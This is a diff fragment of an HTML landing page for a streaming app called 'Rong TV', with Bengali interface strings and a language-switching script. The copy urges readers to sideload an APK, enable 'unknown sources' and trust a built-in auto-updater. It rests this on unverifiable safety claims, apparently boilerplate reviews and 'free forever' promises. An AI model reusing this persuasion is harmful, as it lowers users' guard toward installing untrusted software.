যেকোনো জায়গা থেকে',bigfeat_2:'<strong>৫টি প্রোফাইল</strong> — প্রতিটির জন্য ব্যক্তিগতকৃত সুপারিশ',bigfeat_3:'<strong>কিডস মোড</strong> — ছোটদের জন্য নিরাপদ, বাছাই করা কনটেন্ট',bigfeat_4:'<strong>AI সাবটাইটেল</strong> — ৪০+ ভাষায় রিয়েল-টাইম অনুবাদ',reviews_label:'লক্ষ লক্ষ মানুষের প্রিয়',reviews_h_a:'আমাদের কথা',reviews_h_b:'বিশ্বাস করবেন না',review1:'"অবশেষে একটা অ্যাপ যা সত্যিই কথা রাখে। 4K কোয়ালিটি অসাধারণ আর অফলাইন ডাউনলোড আমার যাতায়াত বাঁচিয়েছে। বাকি সব বাতিল করে দিয়েছি।"',review2:'"মাল্টি-ডিভাইস সিঙ্ক নিখুঁত। টিভিতে শুরু করি, বিছানায় ফোনে শেষ করি। লাইব্রেরি বিশাল আর AI সুপারিশ ভয়ংকর ভালো।"',review3:'"কিডস মোড জীবন বাঁচানো। আমার বাচ্চাদের নিজেদের জায়গা আছে আর তারা কী পাবে তা নিয়ে চিন্তা করতে হয় না। পরিবারের জন্য সেরা স্ট্রিমিং অ্যাপ, নিঃসন্দেহে।"',verified_user:'যাচাইকৃত ব্যবহারকারী',stat1:'বিশ্বব্যাপী ডাউনলোড',stat1_desc:'বিশ্বব্যাপী ডাউনলোড',stat2:'গড় রেটিং',stat3:'উপলব্ধ দেশ',stat4:'আপটাইম গ্যারান্টি',sec_label:'নিরাপদ ও যাচাইকৃত',sec_h_a:'আপনার নিরাপত্তা',sec_h_b:'আমাদের অগ্রাধিকার',sec_sub:'প্রতিটি রিলিজ আপনার কাছে পৌঁছানোর আগে স্ক্যান, সাইন ও যাচাই করা হয়।',sec1_a:'VirusTotal স্ক্যান করা',sec1_b:'১০০% পরিচ্ছন্ন · ৭২টি ইঞ্জিন পাস',sec2_a:'SHA-256 সাইন করা',sec2_b:'ক্রিপ্টোগ্রাফিকভাবে যাচাইকৃত · টেম্পার-প্রুফ',sec3_a:'অটো-আপডেট',sec3_b:'রিলিজের সাথে সাথেই সর্বশেষ ভার্সন',sec4_a:'পারমিশন অপব্যবহার নেই',sec4_b:'শুধুমাত্র যা কঠোরভাবে প্রয়োজন',faq_label:'সাধারণ প্রশ্ন',faq_h_a:'প্রশ্ন আছে?',faq_h_b:'উত্তর আমাদের কাছে।',faq1_q:'APK ইনস্টল করা কি নিরাপদ?',faq1_a:'অবশ্যই। প্রতিটি রিলিজ প্রকাশের আগে VirusTotal স্ক্যানিং (৭২+ ইঞ্জিন), SHA-256 কোড সাইনিং এবং ম্যানুয়াল নিরাপত্তা পর্যালোচনার মধ্য দিয়ে যায়। আমরা কখনোই অ্যাডওয়্যার, স্পাইওয়্যার বা অবাঞ্ছিত সফটওয়্যার বান্ডল করি না। আমাদের নিরাপত্তা পেজে প্রকাশিত হ্যাশ ব্যবহার করে আপনি নিজেই সিগনেচার যাচাই করতে পারেন।',faq2_q:'অ্যাপটি Google Play বা App Store-এ কেন নেই?',faq2_a:'আমরা এখন দ্রুত পুনরাবৃত্তির পর্যায়ে আছি — প্রতি ২ সপ্তাহে নতুন ফিচার ও উন্নতি নিয়ে আপডেট প্রকাশ করছি। সরাসরি বিতরণ আমাদের অ্যাপ স্টোর পর্যালোচনার বিলম্ব ছাড়াই দ্রুত এগোতে দেয়। আমাদের ফিচার-কমপ্লিট মাইলস্টোনে পৌঁছালে ২০২৬ সালের শেষের দিকে অ্যাপ স্টোর তালিকা পরিকল্পিত। একই অ্যাপ, একই কোয়ালিটি, শুধু আপনার জন্য দ্রুত আপডেট।',faq3_q:'অ্যান্ড্রয়েডে APK কীভাবে ইনস্টল করব?',faq3_a:'১. উপরের Download APK বাটনে ট্যাপ করুন।<br>২. ডাউনলোড করা .apk ফাইলটি খুলুন।<br>৩. অনুরোধ এলে Settings → Security-তে "Install from unknown sources" অনুমতি দিন।<br>৪. Install ট্যাপ করুন এবং শেষ! এরপর অ্যাপ নিজেই অটো-আপডেট হবে — ভবিষ্যতের ভার্সন ম্যানুয়ালি ডাউনলোড করার দরকার নেই।',faq4_q:'এটা কি সত্যিই ফ্রি? ফাঁদটা কী?',faq4_a:'হ্যাঁ — ১০০% ফ্রি। কোনো লুকানো ফি নেই, জোরপূর্বক সাবস্ক্রিপশন নেই, কনটেন্টে পেওয়াল নেই। আমরা আমাদের ব্যবহারকারী ভিত্তি তৈরি করছি এবং বিশ্বাস করি যে সেরা স্ট্রিমিং অভিজ্ঞতা তৈরি করলে গ্রোথ আপনার পিছনে আসবে। প্রিমিয়াম ফিচার (অফলাইন ডাউনলোড এবং 4K-এর মতো) আমাদের লঞ্চ পিরিয়ডে ফ্রি। যতদিন থাকে উপভোগ করুন!',faq5_q:'কোন ডিভাইস ও OS ভার্সন সমর্থিত?',faq5_a:'APK-এর জন্য Android 8.0 (Oreo) এবং তার উপরে। IPA-এর জন্য iOS 14+। ফোন, ট্যাবলেট, Android TV এবং Fire TV Stick-এ কাজ করে। সেরা 4K স্ট্রিমিং অভিজ্ঞতার জন্য কমপক্ষে 2 GB RAM সুপারিশ করি। Chromecast এবং AirPlay সমর্থন অন্তর্ভুক্ত।',faq6_q:'ইনস্টল করার পর আপডেট কীভাবে পাব?',faq6_a:'অ্যাপে একটি অন্তর্নির্মিত অটো-আপডেটার আছে। নতুন ভার্সন এলে অ্যাপের ভেতরে নোটিফিকেশন পাবেন — শুধু "Update" ট্যাপ করুন, বাকিটা সে সামলে নেবে। এই পেজে আবার আসার বা ম্যানুয়ালি ডাউনলোড করার দরকার নেই। আমরা প্রায় প্রতি ২ সপ্তাহে ফিক্স ও নতুন ফিচার সহ আপডেট পুশ করি।',footer_copy:'© ২০২৬ Rong TV',footer_priv:'গোপনীয়তা',footer_terms:'শর্তাবলী',footer_sec:'নিরাপত্তা',float_cta:'ফ্রি ডাউনলোড',offer_tag:'লঞ্চ অফার',offer_txt:'প্রিমিয়াম ফ্রি — শেষ হবে',joined_today:'আজ যোগ দিয়েছেন',compare_label:'তুলনা',compare_h_a:'হিসাবটা',compare_h_b:'সহজ',compare_sub:'Rong TV যখন ফ্রি করে, তখন টাকা দেবেন কেন?',save_app:'Rong TV · কোনো সাবস্ক্রিপশন নেই',save_app2:'Rong TV',save_price:'$0 / চিরকালের জন্য',save_others:'অন্য স্ট্রিমিং অ্যাপ',save_others_price:'$12–18 / মাস',save_line:'আপনি সাশ্রয় করেন',guarantee_1:'ক্রেডিট কার্ড নেই',guarantee_2:'বিজ্ঞাপন নেই, কখনোই',guarantee_3:'চিরকাল ফ্রি'
+}
+};
+var lang=(function(){var p=window.location.pathname.toLowerCase();if(p.indexOf('bntv')!==-1)return 'bn';if(p.indexOf('estv')!==-1)return 'es';if(p.indexOf('index')!==-1)return 'en';var s=localStorage.getItem('sflix_lang');if(s==='en'||s==='es'||s==='bn')return s;return 'bn'})();
+function applyLanguage(l){
+document.documentElement.lang=l;var els=document.querySelectorAll('[data-i18n]');
+for(var i=0;i<els.length;i++){var k=els[i].getAttribute('data-i18n');if(T[l]&&T[l][k]!==undefined){var v=T[l][k];if(v.indexOf('<')!==-1&&v.indexOf('>')!==-1){els[i].innerHTML=v}else{els[i].textContent=v}}}
+if(l==='bn'){document.title='Rong TV — পকেটে সিনেমা';var md=document.querySelector('meta[name="description"]');if(md)md.setAttribute('content','Rong TV — ব্লকবাস্টার স্ট্রিম করুন, সিরিজ দেখুন, এবং 4K HDR-এ অফলাইনে দেখুন। কোনো বিজ্ঞাপন নেই। অ্যান্ড্রয়েডের জন্য ফ্রি APK ডাউনলোড করুন।')}
+localStorage.setItem('sflix_lang',l)
+}
+applyLanguage(lang);
+})();
+</script>
+</body>
+</html>
